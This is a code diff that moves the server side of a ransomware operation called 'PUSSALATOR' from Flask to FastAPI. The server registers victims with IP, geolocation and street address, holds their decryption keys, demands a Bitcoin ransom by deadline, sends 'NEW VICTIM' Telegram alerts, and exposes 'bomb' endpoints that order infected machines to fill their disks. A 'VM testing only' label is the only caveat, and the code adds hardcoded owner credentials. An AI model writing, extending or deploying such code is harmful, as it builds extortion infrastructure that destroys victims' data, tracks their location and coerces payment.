@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSSALATOR - Supabase Backend
+PUSSALATOR - FastAPI Supabase Backend
 FOR VM TESTING ONLY
 """
 
@@ -11,33 +11,41 @@ import string
 import hashlib
 from datetime import datetime, timedelta
 from functools import wraps
-from typing import Optional, Dict, Any
+from typing import Optional, Dict, Any, List
+from contextlib import asynccontextmanager
 
-from flask import Flask, request, jsonify, session, redirect, url_for
-from flask_cors import CORS
+# FastAPI imports
+from fastapi import FastAPI, Request, Response, HTTPException, Depends, Cookie
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.staticfiles import StaticFiles
+import uvicorn
+
+# Third party imports
 from supabase import create_client, Client
 import requests
+from pydantic import BaseModel
 
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
 
 class Config:
-    SECRET_KEY = os.environ.get('SECRET_KEY')
+    SECRET_KEY = os.environ.get('SECRET_KEY') or 'pussalator-secret-key-change-this'
     
     # Supabase credentials
-    SUPABASE_URL = os.environ.get('SUPABASE_URL')
-    SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
-    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY') 
+    SUPABASE_URL = os.environ.get('SUPABASE_URL') or 'https://your-project.supabase.co'
+    SUPABASE_KEY = os.environ.get('SUPABASE_KEY') or 'your-supabase-anon-key'
+    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY') or 'your-service-role-key'
     
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT') or '0.5 BTC'
-    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS') or '1PussWalletVMTest'
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS') or 72)
     
     # Owner credentials - CHANGE THIS!
-    OWNER_ID = os.environ.get('OWNER_ID')
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
+    OWNER_ID = os.environ.get('OWNER_ID') or '40671Mps19*'
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD') or 'pussalator123'
     
     # Telegram (optional)
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN') or ''
@@ -46,17 +54,7 @@ class Config:
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
     HOST = '0.0.0.0'
-    PORT = int(os.environ.get('PORT', 5000))
-
-# ============================================================================
-# FLASK APP INIT
-# ============================================================================
-
-app = Flask(__name__)
-app.config['SECRET_KEY'] = Config.SECRET_KEY
-app.config['SESSION_COOKIE_HTTPONLY'] = True
-app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
-CORS(app)
+    PORT = int(os.environ.get('PORT', 8000))
 
 # ============================================================================
 # SUPABASE CLIENT
@@ -66,8 +64,81 @@ supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
 supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
 
 # ============================================================================
-# HELPER FUNCTIONS
+# PYDANTIC MODELS
 # ============================================================================
+
+class VictimRegister(BaseModel):
+    victim_id: Optional[str] = None
+    hostname: Optional[str] = "Unknown"
+    ip: Optional[str] = "0.0.0.0"
+    country: Optional[str] = "Unknown"
+    country_code: Optional[str] = "XX"
+    region: Optional[str] = "Unknown"
+    city: Optional[str] = "Unknown"
+    zip: Optional[str] = "Unknown"
+    street: Optional[str] = "Unknown"
+    lat: Optional[float] = 0.0
+    lon: Optional[float] = 0.0
+    isp: Optional[str] = "Unknown"
+    organization: Optional[str] = "Unknown"
+    os: Optional[str] = "Unknown"
+    files: Optional[int] = 0
+
+class VictimUpdate(BaseModel):
+    victim_id: str
+    files_encrypted: Optional[int] = None
+
+class PaymentVerify(BaseModel):
+    victim_id: str
+    tx_id: Optional[str] = "manual_verification"
+
+class BombUpdate(BaseModel):
+    client_id: str
+    size_gb: Optional[float] = 0
+    error: Optional[str] = None
+
+class OwnerLogin(BaseModel):
+    owner_id: str
+    password: str
+
+class BombControl(BaseModel):
+    victim_id: str
+    filename: Optional[str] = "explosion.dat"
+
+class VictimUpdateAdmin(BaseModel):
+    status: Optional[str] = None
+    ransom_amount: Optional[str] = None
+    btc_address: Optional[str] = None
+    notes: Optional[str] = None
+    tags: Optional[List[str]] = None
+    bomb_status: Optional[str] = None
+
+# ============================================================================
+# SESSION MANAGEMENT
+# ============================================================================
+
+# Simple in-memory session store (for development)
+# In production, use Redis or database-backed sessions
+sessions = {}
+
+def get_session(session_id: str = None):
+    """Get session data"""
+    if not session_id or session_id not in sessions:
+        return {}
+    return sessions.get(session_id, {})
+
+def set_session(session_id: str, data: dict):
+    """Set session data"""
+    sessions[session_id] = data
+
+def clear_session(session_id: str):
+    """Clear session data"""
+    if session_id in sessions:
+        del sessions[session_id]
+
+# ============================================================================
+# HELPER FUNCTIONS
+#===========================================================================
 
 def generate_victim_id() -> str:
     """Generate random victim ID"""
@@ -87,7 +158,8 @@ def log_action(action: str, details: str, victim_id: str = None):
         supabase_admin.table('system_logs').insert({
             'level': 'INFO',
             'message': f"{action}: {details}",
-            'victim_id': victim_id
+            'victim_id': victim_id,
+            'time': datetime.utcnow().isoformat()
         }).execute()
     except:
         pass
@@ -136,62 +208,109 @@ def get_stats() -> Dict[str, Any]:
         }
 
 # ============================================================================
-# AUTHENTICATION DECORATORS
+# DEPENDENCIES
 # ============================================================================
 
-def owner_required(f):
-    """Decorator for owner-only routes"""
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if not session.get('owner_logged_in'):
-            return jsonify({'error': 'Unauthorized'}), 401
-        return f(*args, **kwargs)
-    return decorated_function
+async def get_current_owner(request: Request):
+    """Check if owner is logged in"""
+    session_id = request.cookies.get('session_id')
+    if not session_id:
+        return None
+    
+    session_data = get_session(session_id)
+    if session_data.get('owner_logged_in'):
+        return True
+    return None
+
+# ============================================================================
+# FASTAPI APP INIT
+# ============================================================================
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # Startup
+    print("=" * 60)
+    print("PUSSALATOR - FASTAPI SUPABASE BACKEND")
+    print("=" * 60)
+    print(f"Supabase URL: {Config.SUPABASE_URL}")
+    print(f"Server: http://{Config.HOST}:{Config.PORT}")
+    print(f"Owner ID: {Config.OWNER_ID}")
+    print("=" * 60)
+    print("WARNING: For VM testing only!")
+    print("=" * 60)
+    
+    # Test Supabase connection
+    try:
+        test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
+        print("[+] Supabase connection successful")
+    except Exception as e:
+        print(f"[-] Supabase connection failed: {e}")
+        print("Check your SUPABASE_URL and SUPABASE_KEY")
+    
+    yield
+    
+    # Shutdown
+    print("[+] Shutting down...")
+
+app = FastAPI(
+    title="PUSSALATOR",
+    description="For VM testing only",
+    version="1.0",
+    lifespan=lifespan
+)
+
+# CORS middleware
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 # ============================================================================
 # ROUTES - PUBLIC PAGES
 # ============================================================================
 
-@app.route('/')
-def login_page():
+@app.get("/", response_class=HTMLResponse)
+async def login_page():
     """Main login page"""
-    return render_html(LOGIN_PAGE)
+    return HTMLResponse(content=LOGIN_PAGE)
 
-@app.route('/victim/<victim_id>')
-def victim_page(victim_id):
+@app.get("/victim/{victim_id}", response_class=HTMLResponse)
+async def victim_page(victim_id: str):
     """Victim status page"""
-    return render_html(VICTIM_PAGE.replace('{{ victim_id }}', victim_id))
+    html = VICTIM_PAGE.replace('{{ victim_id }}', victim_id)
+    return HTMLResponse(content=html)
 
-@app.route('/owner/dashboard')
-@owner_required
-def owner_dashboard():
+@app.get("/owner/dashboard", response_class=HTMLResponse)
+async def owner_dashboard(request: Request):
     """Owner dashboard"""
-    return render_html(OWNER_DASHBOARD)
-
-def render_html(html_content):
-    """Render HTML with proper headers"""
-    from flask import make_response
-    response = make_response(html_content)
-    response.headers['Content-Type'] = 'text/html'
-    return response
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        return RedirectResponse(url='/')
+    
+    return HTMLResponse(content=OWNER_DASHBOARD)
 
 # ============================================================================
 # ROUTES - API (Public)
 # ============================================================================
 
-@app.route('/api/stats')
-def api_stats():
+@app.get("/api/stats")
+async def api_stats():
     """Public stats endpoint"""
-    return jsonify(get_stats())
+    return get_stats()
 
-@app.route('/api/victim/<victim_id>')
-def api_get_victim(victim_id):
+@app.get("/api/victim/{victim_id}")
+async def api_get_victim(victim_id: str):
     """Get victim details (public)"""
     try:
         result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
         
         if not result.data:
-            return jsonify({'error': 'Not found'}), 404
+            raise HTTPException(status_code=404, detail="Victim not found")
         
         victim = result.data[0]
         
@@ -206,22 +325,23 @@ def api_get_victim(victim_id):
         if victim['status'] != 'paid':
             victim['key'] = None
         
-        return jsonify(victim)
+        return victim
         
+    except HTTPException:
+        raise
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/add-victim', methods=['POST'])
-def api_add_victim():
+@app.post("/api/add-victim")
+async def api_add_victim(victim_data: VictimRegister):
     """Register new victim (called by client)"""
     try:
-        data = request.json
-        victim_id = data.get('victim_id') or generate_victim_id()
+        victim_id = victim_data.victim_id or generate_victim_id()
         
         # Check if exists
         existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
         if existing.data:
-            return jsonify({'error': 'Victim exists'}), 400
+            raise HTTPException(status_code=400, detail="Victim exists")
         
         # Calculate deadline
         deadline = (datetime.utcnow() + timedelta(hours=Config.DEFAULT_DEADLINE_HOURS)).isoformat()
@@ -230,34 +350,35 @@ def api_add_victim():
         encryption_key = generate_encryption_key()
         
         # Prepare victim data
-        victim_data = {
+        victim_dict = {
             'id': victim_id,
             'key': encryption_key,
             'deadline': deadline,
             'created': datetime.utcnow().isoformat(),
             'status': 'unpaid',
-            'files': data.get('files', 0),
+            'files': victim_data.files,
             'ransom': Config.DEFAULT_RANSOM_AMOUNT,
             'wallet': Config.DEFAULT_BTC_ADDRESS,
-            'hostname': data.get('hostname', 'Unknown'),
-            'ip': data.get('ip', '0.0.0.0'),
-            'country': data.get('country', 'Unknown'),
-            'region': data.get('region', 'Unknown'),
-            'city': data.get('city', 'Unknown'),
-            'zip': data.get('zip', 'Unknown'),
-            'street': data.get('street', 'Unknown'),
-            'lat': data.get('lat', 0.0),
-            'lon': data.get('lon', 0.0),
-            'isp': data.get('isp', 'Unknown'),
-            'org': data.get('organization', 'Unknown'),
-            'os': data.get('os', 'Unknown'),
+            'hostname': victim_data.hostname,
+            'ip': victim_data.ip,
+            'country': victim_data.country,
+            'country_code': victim_data.country_code,
+            'region': victim_data.region,
+            'city': victim_data.city,
+            'zip': victim_data.zip,
+            'street': victim_data.street,
+            'lat': victim_data.lat,
+            'lon': victim_data.lon,
+            'isp': victim_data.isp,
+            'org': victim_data.organization,
+            'os': victim_data.os,
             'bomb_status': 'inactive',
             'bomb_size': 0,
             'tags': ['new']
         }
         
         # Insert into Supabase
-        result = supabase_admin.table('victims').insert(victim_data).execute()
+        result = supabase_admin.table('victims').insert(victim_dict).execute()
         
         # Log
         log_action('new_victim', f'New victim: {victim_id}', victim_id)
@@ -265,7 +386,7 @@ def api_add_victim():
         # Send Telegram notification if configured
         if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
             try:
-                msg = f"🔴 NEW VICTIM\nID: {victim_id}\nLocation: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}\nIP: {data.get('ip', '0.0.0.0')}"
+                msg = f"🔴 NEW VICTIM\nID: {victim_id}\nLocation: {victim_data.city}, {victim_data.country}\nIP: {victim_data.ip}"
                 requests.post(
                     f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={'chat_id': Config.TELEGRAM_CHAT_ID, 'text': msg},
@@ -288,215 +409,245 @@ def api_add_victim():
             response['telegram_bot_token'] = Config.TELEGRAM_BOT_TOKEN
             response['telegram_chat_id'] = Config.TELEGRAM_CHAT_ID
         
-        return jsonify(response), 200
+        return response
         
+    except HTTPException:
+        raise
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/update-victim', methods=['POST'])
-def api_update_victim():
+@app.post("/api/update-victim")
+async def api_update_victim(update_data: VictimUpdate):
     """Update victim info"""
     try:
-        data = request.json
-        victim_id = data.get('victim_id')
-        files = data.get('files_encrypted')
-        
-        update_data = {
+        update_dict = {
             'last_seen': datetime.utcnow().isoformat()
         }
         
-        if files is not None:
-            update_data['files'] = files
+        if update_data.files_encrypted is not None:
+            update_dict['files'] = update_data.files_encrypted
         
-        supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
+        supabase_admin.table('victims').update(update_dict).eq('id', update_data.victim_id).execute()
         
-        return jsonify({'success': True}), 200
+        return {'success': True}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/verify-payment', methods=['POST'])
-def api_verify_payment():
+@app.post("/api/verify-payment")
+async def api_verify_payment(payment_data: PaymentVerify):
     """Verify payment from client"""
     try:
-        data = request.json
-        victim_id = data.get('victim_id')
-        tx_id = data.get('tx_id', 'manual_verification')
-        
         # Update victim
         supabase_admin.table('victims').update({
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat(),
-            'tx': tx_id
-        }).eq('id', victim_id).execute()
+            'tx': payment_data.tx_id
+        }).eq('id', payment_data.victim_id).execute()
         
         # Get key
-        result = supabase_admin.table('victims').select('key').eq('id', victim_id).execute()
+        result = supabase_admin.table('victims').select('key').eq('id', payment_data.victim_id).execute()
         key = result.data[0]['key'] if result.data else None
         
-        log_action('payment', f'Payment for {victim_id}: {tx_id}', victim_id)
+        log_action('payment', f'Payment for {payment_data.victim_id}: {payment_data.tx_id}', payment_data.victim_id)
         
-        return jsonify({'success': True, 'key': key}), 200
+        return {'success': True, 'key': key}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
 # ROUTES - API (Bomb Commands)
 # ============================================================================
 
-@app.route('/api/bomb/command/<victim_id>')
-def api_get_bomb_command(victim_id):
+@app.get("/api/bomb/command/{victim_id}")
+async def api_get_bomb_command(victim_id: str):
     """Get pending bomb command"""
-    # Check bomb status - in a real implementation you'd have a commands table
-    # For simplicity, we'll just check the victim's bomb_status
     result = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
     
     if result.data and result.data[0].get('bomb_status') == 'active':
-        return jsonify({'action': 'start', 'filename': 'explosion.dat'})
+        return {'action': 'start', 'filename': 'explosion.dat'}
     
-    return jsonify({'action': 'none'})
+    return {'action': 'none'}
 
-@app.route('/api/bomb/update', methods=['POST'])
-def api_bomb_update():
+@app.post("/api/bomb/update")
+async def api_bomb_update(bomb_data: BombUpdate):
     """Update bomb status"""
     try:
-        data = request.json
-        victim_id = data.get('client_id')
-        size_gb = data.get('size_gb', 0)
-        error = data.get('error')
+        update_dict = {}
         
-        update_data = {}
-        
-        if error:
-            update_data['bomb_status'] = 'error'
-            update_data['notes'] = f"Bomb error: {error}"
+        if bomb_data.error:
+            update_dict['bomb_status'] = 'error'
+            update_dict['notes'] = f"Bomb error: {bomb_data.error}"
         else:
-            update_data['bomb_size'] = size_gb
+            update_dict['bomb_size'] = bomb_data.size_gb
         
-        supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
+        supabase_admin.table('victims').update(update_dict).eq('id', bomb_data.client_id).execute()
         
-        return jsonify({'success': True}), 200
+        return {'success': True}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
 # ROUTES - API (Owner Only)
 # ============================================================================
 
-@app.route('/api/owner/login', methods=['POST'])
-def api_owner_login():
+@app.post("/api/owner/login")
+async def api_owner_login(login_data: OwnerLogin, request: Request, response: Response):
     """Owner login API"""
-    data = request.json
-    owner_id = data.get('owner_id')
-    password = data.get('password')
-    
-    if owner_id == Config.OWNER_ID and password == Config.OWNER_PASSWORD:
-        session['owner_logged_in'] = True
-        session.permanent = True
+    if login_data.owner_id == Config.OWNER_ID and login_data.password == Config.OWNER_PASSWORD:
+        # Create session
+        session_id = hashlib.sha256(os.urandom(32)).hexdigest()
+        set_session(session_id, {'owner_logged_in': True})
+        
+        # Set cookie
+        response.set_cookie(
+            key='session_id',
+            value=session_id,
+            httponly=True,
+            max_age=86400,  # 24 hours
+            samesite='lax'
+        )
+        
         log_action('owner_login', 'Owner logged in')
-        return jsonify({'success': True})
+        return {'success': True}
     
-    return jsonify({'success': False}), 401
+    raise HTTPException(status_code=401, detail="Invalid credentials")
 
-@app.route('/api/owner/logout', methods=['POST'])
-def api_owner_logout():
+@app.post("/api/owner/logout")
+async def api_owner_logout(request: Request, response: Response):
     """Owner logout"""
-    session.pop('owner_logged_in', None)
-    return jsonify({'success': True})
+    session_id = request.cookies.get('session_id')
+    if session_id:
+        clear_session(session_id)
+        response.delete_cookie('session_id')
+    
+    return {'success': True}
 
-@app.route('/api/owner/victims')
-@owner_required
-def api_owner_victims():
+@app.get("/api/owner/victims")
+async def api_owner_victims(request: Request):
     """Get all victims (owner only)"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
         result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
-        return jsonify(result.data)
+        return result.data
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/victim/<victim_id>')
-@owner_required
-def api_owner_victim(victim_id):
+@app.get("/api/owner/victim/{victim_id}")
+async def api_owner_victim(victim_id: str, request: Request):
     """Get single victim (owner only)"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
         result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
         
         if not result.data:
-            return jsonify({'error': 'Not found'}), 404
+            raise HTTPException(status_code=404, detail="Not found")
         
-        return jsonify(result.data[0])
+        return result.data[0]
+    except HTTPException:
+        raise
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/victim/<victim_id>', methods=['PUT'])
-@owner_required
-def api_owner_update_victim(victim_id):
+@app.put("/api/owner/victim/{victim_id}")
+async def api_owner_update_victim(victim_id: str, update_data: VictimUpdateAdmin, request: Request):
     """Update victim (owner only)"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
-        data = request.json
-        update_data = {}
+        update_dict = {}
         
-        # Only allow updating specific fields
-        allowed_fields = ['status', 'ransom', 'wallet', 'notes', 'tags', 'bomb_status']
+        # Map fields
+        field_mapping = {
+            'status': 'status',
+            'ransom_amount': 'ransom',
+            'btc_address': 'wallet',
+            'notes': 'notes',
+            'tags': 'tags',
+            'bomb_status': 'bomb_status'
+        }
         
-        for field in allowed_fields:
-            if field in data:
-                update_data[field] = data[field]
+        for key, value in update_data.dict(exclude_unset=True).items():
+            if key in field_mapping and value is not None:
+                update_dict[field_mapping[key]] = value
         
-        if update_data:
-            supabase_admin.table('victims').update(update_data).eq('id', victim_id).execute()
+        if update_dict:
+            supabase_admin.table('victims').update(update_dict).eq('id', victim_id).execute()
             log_action('update_victim', f'Updated {victim_id}', victim_id)
         
-        return jsonify({'success': True})
+        return {'success': True}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/bomb/start', methods=['POST'])
-@owner_required
-def api_owner_bomb_start():
+@app.post("/api/owner/bomb/start")
+async def api_owner_bomb_start(bomb_data: BombControl, request: Request):
     """Start bomb on victim"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
-        data = request.json
-        victim_id = data.get('victim_id')
-        
         supabase_admin.table('victims').update({
             'bomb_status': 'active',
             'bomb_size': 0
-        }).eq('id', victim_id).execute()
+        }).eq('id', bomb_data.victim_id).execute()
         
-        log_action('bomb_start', f'Started bomb on {victim_id}', victim_id)
+        log_action('bomb_start', f'Started bomb on {bomb_data.victim_id}', bomb_data.victim_id)
         
-        return jsonify({'success': True})
+        return {'success': True}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/bomb/stop', methods=['POST'])
-@owner_required
-def api_owner_bomb_stop():
+@app.post("/api/owner/bomb/stop")
+async def api_owner_bomb_stop(bomb_data: BombControl, request: Request):
     """Stop bomb on victim"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
-        data = request.json
-        victim_id = data.get('victim_id')
-        
         supabase_admin.table('victims').update({
             'bomb_status': 'stopped'
-        }).eq('id', victim_id).execute()
+        }).eq('id', bomb_data.victim_id).execute()
         
-        log_action('bomb_stop', f'Stopped bomb on {victim_id}', victim_id)
+        log_action('bomb_stop', f'Stopped bomb on {bomb_data.victim_id}', bomb_data.victim_id)
         
-        return jsonify({'success': True})
+        return {'success': True}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/mark-paid/<victim_id>', methods=['POST'])
-@owner_required
-def api_owner_mark_paid(victim_id):
+@app.post("/api/owner/mark-paid/{victim_id}")
+async def api_owner_mark_paid(victim_id: str, request: Request):
     """Mark victim as paid"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
         supabase_admin.table('victims').update({
             'status': 'paid',
@@ -505,31 +656,41 @@ def api_owner_mark_paid(victim_id):
         
         log_action('mark_paid', f'Marked {victim_id} as paid', victim_id)
         
-        return jsonify({'success': True})
+        return {'success': True}
         
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/delete-victim/<victim_id>', methods=['DELETE'])
-@owner_required
-def api_owner_delete_victim(victim_id):
+@app.delete("/api/owner/delete-victim/{victim_id}")
+async def api_owner_delete_victim(victim_id: str, request: Request):
     """Delete victim (careful!)"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
         supabase_admin.table('victims').delete().eq('id', victim_id).execute()
         log_action('delete_victim', f'Deleted {victim_id}', victim_id)
-        return jsonify({'success': True})
+        return {'success': True}
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.route('/api/owner/logs')
-@owner_required
-def api_owner_logs():
+@app.get("/api/owner/logs")
+async def api_owner_logs(request: Request):
     """Get logs"""
+    session_id = request.cookies.get('session_id')
+    session_data = get_session(session_id)
+    
+    if not session_data.get('owner_logged_in'):
+        raise HTTPException(status_code=401, detail="Unauthorized")
+    
     try:
         result = supabase_admin.table('system_logs').select('*').order('time', desc=True).limit(100).execute()
-        return jsonify(result.data)
+        return result.data
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
 # HTML TEMPLATES - FIXED: Properly assigned to variables
@@ -1558,28 +1719,9 @@ OWNER_DASHBOARD_HTML = """
 # ============================================================================
 
 if __name__ == '__main__':
-    print("=" * 60)
-    print("PUSSALATOR - SUPABASE BACKEND")
-    print("=" * 60)
-    print(f"Supabase URL: {Config.SUPABASE_URL}")
-    print(f"Server: http://{Config.HOST}:{Config.PORT}")
-    print(f"Owner ID: {Config.OWNER_ID}")
-    print(f"Debug mode: {Config.DEBUG}")
-    print("=" * 60)
-    print("WARNING: For VM testing only!")
-    print("=" * 60)
-    
-    # Test Supabase connection
-    try:
-        test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
-        print("[+] Supabase connection successful")
-    except Exception as e:
-        print(f"[-] Supabase connection failed: {e}")
-        print("Check your SUPABASE_URL and SUPABASE_KEY")
-        sys.exit(1)
-    
-    app.run(
+    uvicorn.run(
+        "main:app",
         host=Config.HOST,
         port=Config.PORT,
-        debug=Config.DEBUG
+        reload=Config.DEBUG
     )
